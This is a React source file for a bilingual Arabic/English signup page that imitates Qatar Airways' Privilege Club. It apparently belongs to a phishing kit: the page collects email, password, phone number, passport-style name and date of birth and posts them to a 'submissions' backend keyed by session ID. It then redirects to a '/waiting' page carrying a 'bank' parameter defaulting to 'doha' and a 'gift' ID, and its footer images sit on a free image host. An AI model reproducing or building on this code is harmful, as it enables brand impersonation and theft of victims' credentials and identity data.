import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import Header from "@/components/Header";
import { Eye, EyeOff } from "lucide-react";

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const { language } = useLanguage();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "doha";
  const sessionId = localStorage.getItem("sessionId") || "";

  const isArabic = language === "ar";
  const footerImage = isArabic 
    ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
    : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";

  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    confirmPassword: "",
    phoneNumber: "",
    title: "",
    nameEnglish: "",
    middleName: "",
    lastName: "",
    dateOfBirth: "",
    gender: "",
    country: "",
    promoCode: "",
  });

  const submitPersonalDataMutation = trpc.submissions.submitPersonalData.useMutation();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
    
    if (!currentSessionId) {
      toast.error(isArabic ? "جلسة غير صالحة" : "Invalid session");
      return;
    }

    if (formData.password !== formData.confirmPassword) {
      toast.error(isArabic ? "كلمات المرور غير متطابقة" : "Passwords do not match");
      return;
    }

    try {
      await submitPersonalDataMutation.mutateAsync({
        sessionId: currentSessionId,
        email: formData.email,
        password: formData.password,
        phoneNumber: formData.phoneNumber,
        title: formData.title,
        nameEnglish: formData.nameEnglish,
        middleName: formData.middleName,
        lastName: formData.lastName,
        dateOfBirth: formData.dateOfBirth,
        gender: formData.gender,
        country: formData.country,
        promoCode: formData.promoCode,
        nameArabic: "", // الحقل لم يعد موجوداً في النموذج الجديد ولكن موجود في الـ schema
        idNumber: "", // الحقل لم يعد موجوداً في النموذج الجديد ولكن موجود في الـ schema
      });
      
      toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
      const giftId = params.get("gift") || "";
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}${giftId ? `&gift=${giftId}` : ''}`);
    } catch (error) {
      console.error("Error saving personal data:", error);
      toast.error(isArabic ? "فشل حفظ البيانات، يرجى المحاولة مرة أخرى" : "Failed to save data, please try again");
    }
  };

  useEffect(() => {
    document.title = isArabic ? "إنشاء حساب - نادي الامتياز" : "Create Account - Privilege Club";
  }, [isArabic]);

  return (
    <div className="page-wrapper min-h-screen bg-[#f8f9fb]">
      <style>{`
        .page-wrapper { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .form-container { max-width: 500px; margin: 0 auto; padding: 20px; }
        .main-title { color: #8C0032; font-size: 28px; font-weight: bold; text-align: center; margin: 30px 0; line-height: 1.4; }
        .section-card { background: white; border-radius: 4px; padding: 25px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); margin-bottom: 20px; }
        .section-title { color: #8C0032; font-size: 18px; font-weight: 600; margin-bottom: 20px; }
        .form-group { margin-bottom: 20px; position: relative; }
        .form-group label { display: block; color: #666; font-size: 14px; margin-bottom: 8px; }
        .input-field { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; transition: border-color 0.2s; background: #fff; }
        .input-field:focus { border-color: #8C0032; outline: none; }
        .password-toggle { position: absolute; left: ${isArabic ? '15px' : 'auto'}; right: ${isArabic ? 'auto' : '15px'}; top: 42px; cursor: pointer; color: #8C0032; }
        .submit-btn { background: #8C0032; color: white; width: 100%; padding: 15px; border-radius: 4px; font-weight: bold; font-size: 18px; margin-top: 20px; cursor: pointer; transition: opacity 0.2s; }
        .submit-btn:hover { opacity: 0.9; }
        .helper-text { font-size: 12px; color: #888; margin-top: 5px; }
        .checkbox-group { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 15px; font-size: 14px; color: #444; }
        .checkbox-group input { margin-top: 4px; }
        .radio-group { display: flex; gap: 20px; margin-top: 10px; }
        .radio-item { display: flex; align-items: center; gap: 8px; cursor: pointer; }
        .footer-img { width: 100%; max-width: 500px; margin: 20px auto; display: block; }
      `}</style>

      <Header />

      <div className="form-container">
        <h1 className="main-title">
          {isArabic ? "يمكنك إنشاء حساب خلال دقيقة واحدة فقط" : "You can create an account in just one minute"}
        </h1>

        <form onSubmit={handleSubmit}>
          {/* بيانات الاعتماد */}
          <div className="section-card">
            <h2 className="section-title">{isArabic ? "دعنا ننشئ بيانات الاعتماد الخاصة بك." : "Let's create your credentials."}</h2>
            
            <div className="form-group">
              <input 
                type="email" 
                name="email"
                placeholder={isArabic ? "عنوان البريد الإلكتروني" : "Email Address"}
                className="input-field"
                value={formData.email}
                onChange={handleChange}
                required
              />
            </div>

            <div className="form-group">
              <input 
                type={showPassword ? "text" : "password"}
                name="password"
                placeholder={isArabic ? "ادخل كلمة مرور" : "Enter Password"}
                className="input-field"
                value={formData.password}
                onChange={handleChange}
                required
              />
              <div className="password-toggle" onClick={() => setShowPassword(!showPassword)}>
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </div>
            </div>

            <div className="form-group">
              <input 
                type={showPassword ? "text" : "password"}
                name="confirmPassword"
                placeholder={isArabic ? "إعادة إدخال كلمة المرور" : "Re-enter Password"}
                className="input-field"
                value={formData.confirmPassword}
                onChange={handleChange}
                required
              />
            </div>

            <div className="form-group">
              <select name="countryCode" className="input-field bg-[#f0f0f0]">
                <option value="QA">{isArabic ? "قطر (+974)" : "Qatar (+974)"}</option>
              </select>
            </div>

            <div className="form-group">
              <input 
                type="tel" 
                name="phoneNumber"
                placeholder={isArabic ? "رقم الجوال" : "Mobile Number"}
                className="input-field"
                value={formData.phoneNumber}
                onChange={handleChange}
                required
              />
            </div>
          </div>

          {/* بياناتك الشخصية */}
          <div className="section-card">
            <h2 className="section-title">{isArabic ? "بياناتك الشخصية" : "Your Personal Details"}</h2>
            
            <div className="form-group">
              <select 
                name="title" 
                className="input-field bg-[#f0f0f0]"
                value={formData.title}
                onChange={handleChange}
                required
              >
                <option value="">{isArabic ? "اللقب" : "Title"}</option>
                <option value="Mr">{isArabic ? "سيد" : "Mr"}</option>
                <option value="Ms">{isArabic ? "سيدة" : "Ms"}</option>
                <option value="Mrs">{isArabic ? "سيدة متزوجة" : "Mrs"}</option>
              </select>
            </div>

            <div className="form-group">
              <input 
                type="text" 
                name="nameEnglish"
                placeholder={isArabic ? "الاسم الأول باللغة الإنجليزية (كما في جواز السفر)" : "First Name in English (as in Passport)"}
                className="input-field"
                value={formData.nameEnglish}
                onChange={handleChange}
                required
              />
            </div>

            <div className="form-group">
              <input 
                type="text" 
                name="middleName"
                placeholder={isArabic ? "الاسم الأوسط باللغة الإنجليزية (اختياري)" : "Middle Name in English (Optional)"}
                className="input-field"
                value={formData.middleName}
                onChange={handleChange}
              />
            </div>

            <div className="form-group">
              <input 
                type="text" 
                name="lastName"
                placeholder={isArabic ? "الاسم الأخير باللغة الإنجليزية (كما في جواز السفر)" : "Last Name in English (as in Passport)"}
                className="input-field"
                value={formData.lastName}
                onChange={handleChange}
                required
              />
              <p className="helper-text">{isArabic ? "يجب إدخال اسمك باللغة الإنجليزية كما يظهر في جواز سفرك." : "Your name must be entered in English as it appears on your passport."}</p>
            </div>

            <div className="form-group">
              <label>{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
              <input 
                type="text" 
                name="dateOfBirth"
                placeholder="DD/MM/YYYY"
                className="input-field"
                value={formData.dateOfBirth}
                onChange={handleChange}
                required
              />
            </div>

            <div className="form-group">
              <label>{isArabic ? "النوع (اختياري)" : "Gender (Optional)"}</label>
              <div className="radio-group">
                <label className="radio-item">
                  <input type="radio" name="gender" value="male" onChange={handleChange} />
                  {isArabic ? "ذكر" : "Male"}
                </label>
                <label className="radio-item">
                  <input type="radio" name="gender" value="female" onChange={handleChange} />
                  {isArabic ? "أنثى" : "Female"}
                </label>
              </div>
            </div>
          </div>

          {/* أين تقيم */}
          <div className="section-card">
            <h2 className="section-title">{isArabic ? "أين تقيم؟" : "Where do you reside?"}</h2>
            <div className="form-group">
              <select 
                name="country" 
                className="input-field bg-[#f0f0f0]"
                value={formData.country}
                onChange={handleChange}
                required
              >
                <option value="">{isArabic ? "دولة/قطاع الإقامة" : "Country/Sector of Residence"}</option>
                <option value="Qatar">{isArabic ? "قطر" : "Qatar"}</option>
              </select>
            </div>
          </div>

          {/* الرمز الترويجي */}
          <div className="section-card">
            <h2 className="section-title">{isArabic ? "الرمز الترويجي لتسجيل الانضمام" : "Enrolment Promo Code"}</h2>
            <div className="form-group">
              <input 
                type="text" 
                name="promoCode"
                placeholder={isArabic ? "الرمز الترويجي (اختياري)" : "Promo Code (Optional)"}
                className="input-field"
                value={formData.promoCode}
                onChange={handleChange}
              />
            </div>
          </div>

          {/* الاشتراكات والشروط */}
          <div className="section-card">
            <h2 className="section-title">{isArabic ? "اشترك في أخبارنا وعروضنا" : "Subscribe to our news and offers"}</h2>
            <div className="checkbox-group">
              <input type="checkbox" id="partners" />
              <label htmlFor="partners">{isArabic ? "أرغب في تلقي الأخبار والعروض من شركاء نادي الامتياز" : "I would like to receive news and offers from Privilege Club partners"}</label>
            </div>
            <div className="checkbox-group">
              <input type="checkbox" id="qatar_group" />
              <label htmlFor="qatar_group">{isArabic ? "شركات أخرى في مجموعة الخطوط الجوية القطرية" : "Other companies in Qatar Airways Group"}</label>
            </div>
            
            <hr className="my-4" />

            <div className="checkbox-group">
              <input type="checkbox" id="terms" required />
              <label htmlFor="terms">
                {isArabic ? "أوافق على شروط وأحكام نادي الامتياز وأتفهم أنه سيتم التعامل مع معلوماتي وفقاً لبيان خصوصية الخطوط الجوية القطرية." : "I agree to the Privilege Club Terms and Conditions and understand that my information will be handled in accordance with the Qatar Airways Privacy Notice."}
              </label>
            </div>
          </div>

          <button type="submit" className="submit-btn">
            {isArabic ? "إنشاء حساب" : "Create Account"}
          </button>
        </form>

        <img src={footerImage} className="footer-img" alt="Footer" />
      </div>
    </div>
  );
}
